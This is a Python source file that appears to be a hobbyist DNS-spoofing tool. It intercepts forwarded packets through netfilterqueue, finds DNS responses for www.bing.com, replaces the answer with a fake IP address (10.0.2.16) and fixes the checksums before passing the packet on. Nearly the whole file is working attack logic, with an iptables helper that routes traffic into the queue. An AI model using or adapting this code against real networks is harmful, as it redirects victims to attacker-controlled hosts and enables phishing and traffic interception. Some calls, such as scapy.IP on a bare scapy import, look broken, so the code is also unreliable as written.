import netfilterqueue
import pyptables
import scapy

def main():
    #setup_iptables()

    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        #TODO This may cause issues because except code isn't executing properly in my enviornment
        print('Resetting IP tables and exiting...')
        #flush_iptables()


def setup_iptables():
    table = pyptables.Table('filter')
    chain = table.chain('FORWARD')
    rule = pyptables.Rule()
    target = pyptables.Target('NFQUEUE')
    target.set_parameter('queue-num', '0')
    rule.target = target
    chain.insert_rule(rule, position=0)


def flush_iptables():
    table = pyptables.Table('filter')
    chain = table.chain('FORWARD')
    chain.flush()


def process_packet(packet):
    #TODO argparse for the website to spoof and fake IP to return
    website = 'www.bing.com'
    fake_IP = '10.0.2.16'
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if website in qname.decode():  # Decode bytes to string for comparison in Python 3
            print(f'[+] Found {website} in DNS request. Spoofing...')
            answer = scapy.DNSRR(rrname=qname, rdata=fake_IP)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # Removes the len and chksum args from packet and scapy will recalculate based on our ans before sending
                # Ensures no corruption errors when sending.
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))  # Convert scapy packet to bytes for Python 3

    packet.accept()


if __name__ == '__main__':
    main()